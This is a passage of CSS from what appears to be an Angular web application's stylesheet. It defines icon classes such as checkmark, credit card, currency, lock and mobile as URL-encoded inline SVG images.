1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-checkmark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_checkmark%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2231.9%2014.46%2015.3%2025.29%2011.77%2016.64%2010%2017.58%2014.46%2026%2032.84%2016.23%2031.9%2014.46%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-roundarrows[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_circlearrows%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31.45%2C26.81a12%2C12%2C0%2C0%2C1-21.16-.27l1.73-1a10%2C10%2C0%2C0%2C0%2C17.66.35l-3.21-1.7%2C7.84-4.9.32%2C9.23ZM26.59%2C10.41a12%2C12%2C0%2C0%2C0-16.16%2C4.85L7.37%2C13.62l.32%2C9.23L15.52%2C18l-3.32-1.77a10%2C10%2C0%2C0%2C1%2C17.67.32l1.73-1A11.94%2C11.94%2C0%2C0%2C0%2C26.59%2C10.41Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-creditCard[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_creditcard%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C23v2H11V23Zm14-8h0V27a4%2C4%2C0%2C0%2C1-4%2C4H11a4%2C4%2C0%2C0%2C1-4-4V15H7a4%2C4%2C0%2C0%2C1%2C4-4H31a4%2C4%2C0%2C0%2C1%2C4%2C4ZM11%2C29H21.44L33%2C22.85V19H9v8A2%2C2%2C0%2C0%2C0%2C11%2C29Zm22-2V25.12L25.7%2C29H31A2%2C2%2C0%2C0%2C0%2C33%2C27Zm0-12a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2v2H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-currency[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_currency_bill%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M7%2C13V29H35V13Zm26%2C7.88L24.18%2C25.6A6.48%2C6.48%2C0%2C0%2C0%2C26%2C21c0-3.19-2.08-5.77-4.7-6v0H33ZM9%2C15h7.49L9%2C19Zm12%2C2c1.66%2C0%2C3%2C1.79%2C3%2C4s-1.34%2C4-3%2C4-3-1.79-3-4S19.34%2C17%2C21%2C17ZM9%2C21.22l8.5-4.5A6.61%2C6.61%2C0%2C0%2C0%2C16%2C21c0%2C3.24%2C2.14%2C5.86%2C4.82%2C6v0H9ZM25.84%2C27%2C33%2C23.18V27Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-docuarrow[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_docuarrow%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.13l5.09-2.67A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM27.73%2C28.85l-4%2C2.15H23V27h6A2%2C2%2C0%2C0%2C1%2C27.73%2C28.85ZM21%2C25v6H13V11H29v6H23V14l-7%2C4%2C7%2C4V19h6v6Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-docucheck[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_docucheck%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.14l5.08-2.7h0A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM29%2C27a2%2C2%2C0%2C0%2C1-1.27%2C1.85l-4%2C2.15H23V27Zm0-2H21v6H13V11H29ZM17.53%2C21.84%2C15%2C16.93%2C16.72%2C16l1.65%2C3.15L26.24%2C15l.94%2C1.77Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-document[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_document%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.13l5.08-2.7h0A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM29%2C27a2%2C2%2C0%2C0%2C1-1.27%2C1.85l-4%2C2.15H23V27Zm0-2H21v6H13V11H29ZM27%2C15H15V13H27ZM15%2C19V17h8v2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-dollar[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_dollar%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22.32%2C34.26H19.79v-3.8a9.09%2C9.09%2C0%2C0%2C1-5.15-2.56l-.18-.19%2C1.74-1.94.21.2a6.7%2C6.7%2C0%2C0%2C0%2C4.72%2C2.14c2.36%2C0%2C3.71-1%2C3.71-2.76%2C0-1.55-.95-2.34-4.23-3.52-3.74-1.34-5.51-2.5-5.51-5.51%2C0-2.6%2C1.75-4.37%2C4.7-4.78V7.74h2.53v3.76a8.53%2C8.53%2C0%2C0%2C1%2C4.62%2C2l.22.17-1.67%2C2-.21-.18A6.17%2C6.17%2C0%2C0%2C0%2C21%2C13.88c-2.14%2C0-3.31.82-3.31%2C2.31%2C0%2C1.27.4%2C2%2C4.2%2C3.33%2C4.25%2C1.53%2C5.54%2C2.87%2C5.54%2C5.72s-2%2C4.79-5.12%2C5.21Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-download[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_download%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C23v2a6%2C6%2C0%2C0%2C1-6%2C6H15a6%2C6%2C0%2C0%2C1-6-6V23h2v2a4%2C4%2C0%2C0%2C0%2C4%2C4H27a4%2C4%2C0%2C0%2C0%2C4-4V23ZM22%2C17V9H20v8H16.38L21%2C25l4.62-8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-envelop[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_envelope%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C15h0V13H9V25a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6V15ZM31%2C25a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4h0V19.75l10%2C5.32%2C10-5.27Zm0-7.46L21%2C22.83%2C11%2C17.49V15H31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-euro[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_euro%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22%2C31c-3.13%2C0-5.75-3-6.64-7H21V22H15.07c0-.33-.07-.66-.07-1s0-.67.07-1H21V18H15.36c.89-4%2C3.52-7%2C6.64-7a6.26%2C6.26%2C0%2C0%2C1%2C5.09%2C3.16l1.73-.92C27.17%2C10.67%2C24.74%2C9%2C22%2C9c-4.2%2C0-7.71%2C3.83-8.71%2C9H11v2h2c0%2C.33%2C0%2C.66%2C0%2C1s0%2C.67%2C0%2C1H11v2h2.3c1%2C5.17%2C4.52%2C9%2C8.71%2C9%2C2.74%2C0%2C5.16-1.67%2C6.8-4.25l-1.71-.91A6.25%2C6.25%2C0%2C0%2C1%2C22%2C31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-jbp[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_GBP%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27.17%2C26.86a4%2C4%2C0%2C0%2C1-3.73%2C2.59%2C3.65%2C3.65%2C0%2C0%2C1-1.54-.37v0L19%2C27.56V21h6V19H19V15h0a4%2C4%2C0%2C0%2C1%2C4-4%2C3.94%2C3.94%2C0%2C0%2C1%2C2.56%2C1l1.88-1A6%2C6%2C0%2C0%2C0%2C17%2C15h0v4H15v2h2v6.29l-4%2C2.13.94%2C1.77%2C3.8-2%2C2.83%2C1.51a5.79%2C5.79%2C0%2C0%2C0%2C.52.28l.37.13a5.83%2C5.83%2C0%2C0%2C0%2C2%2C.38A6%2C6%2C0%2C0%2C0%2C29%2C27.8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-info[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_info%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M23%2C13a2%2C2%2C0%2C1%2C1-2-2%2C2%2C2%2C0%2C0%2C1%2C2%2C2m12%2C8A14%2C14%2C0%2C1%2C0%2C21%2C35%2C14%2C14%2C0%2C0%2C0%2C35%2C21m2%2C0A16%2C16%2C0%2C1%2C1%2C21%2C5%2C16%2C16%2C0%2C0%2C1%2C37%2C21M23%2C17.09l-4.74%2C2.52.94%2C1.77%2C1.8-1V31h2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-laptop[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_laptop%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31%2C25V11H11V25H7a6%2C6%2C0%2C0%2C0%2C6%2C6H29a6%2C6%2C0%2C0%2C0%2C6-6ZM13%2C13h8.43L13%2C17.48Zm0%2C6.75L25.69%2C13H29V25H13ZM29%2C29H13a4%2C4%2C0%2C0%2C1-3.46-2H32.47A4%2C4%2C0%2C0%2C1%2C29%2C29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-lightbulb[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_lightbulb%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M17%2C29h8v2H17Zm2%2C6h4V33H19Zm6.44-18.14-.94-1.77L21%2C17%2C17.5%2C15.1l-.94%2C1.77L21%2C19.22h0Zm-.44%2C7V27H17V23.87a8%2C8%2C0%2C1%2C1%2C8%2C0ZM27%2C17a6%2C6%2C0%2C1%2C0-8%2C5.63V25h4V22.63A6%2C6%2C0%2C0%2C0%2C27%2C17Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-list[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_list%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M15%2C11H31v2H15Zm0%2C14H31V23H15Zm0%2C6H31V29H15Zm0-12H31V17H15Zm-3-6a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0%2C12a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0-6a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0%2C12a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-lock[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_lock%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27%2C15V13h0a6%2C6%2C0%2C1%2C0-12%2C0v2H11v2h0v8a6%2C6%2C0%2C0%2C0%2C6%2C6h8a6%2C6%2C0%2C0%2C0%2C6-6V15ZM17%2C13a4%2C4%2C0%2C1%2C1%2C8%2C0h0v2H17ZM29%2C25a4%2C4%2C0%2C0%2C1-4%2C4H17a4%2C4%2C0%2C0%2C1-2.89-1.23L29%2C19.88Zm0-7.39L13.14%2C26A3.87%2C3.87%2C0%2C0%2C1%2C13%2C25V17H29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-mapping[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_mappin%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C17c0%2C4.73-8%2C14.9-8%2C14.9S13%2C21.73%2C13%2C17a7.81%2C7.81%2C0%2C0%2C1%2C8-8%2C7.81%2C7.81%2C0%2C0%2C1%2C8%2C8m2%2C0a10%2C10%2C0%2C0%2C0-20%2C0c0%2C5.52%2C10%2C18%2C10%2C18S31%2C22.52%2C31%2C17m-6%2C0a4%2C4%2C0%2C1%2C1-4-4%2C4%2C4%2C0%2C0%2C1%2C4%2C4m2%2C0a6%2C6%2C0%2C1%2C0-6%2C6%2C6%2C6%2C0%2C0%2C0%2C6-6%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-menu[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_menu%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C15H31v2H11Zm0%2C12H31V25H11Zm0-5H31V20H11Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-minus[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_minus%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2210%2021%2029%2021%2030%2021%2030%2019%2010%2019%2010%2021%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-mobile[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!--%20Generator%3A%20Adobe%20Illustrator%2022.0.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cpath%20class%3D%22st0%22%20d%3D%22M15.5%2C7.99963c-1.40002%2C0-2.5%2C1.09998-2.5%2C2.5v1.5v1v14v1v1.5c0%2C1.39996%2C1.09998%2C2.5%2C2.5%2C2.5h9%0A%09c1.40002%2C0%2C2.5-1.10004%2C2.5-2.5v-1.5v-1v-14v-1v-1.5c0-1.40002-1.09998-2.5-2.5-2.5H15.5z%20M26%2C29.49963%0A%09c0%2C0.79999-0.70001%2C1.5-1.5%2C1.5h-9c-0.79999%2C0-1.5-0.70001-1.5-1.5v-1.5h12V29.49963z%20M26%2C26.99963H14v-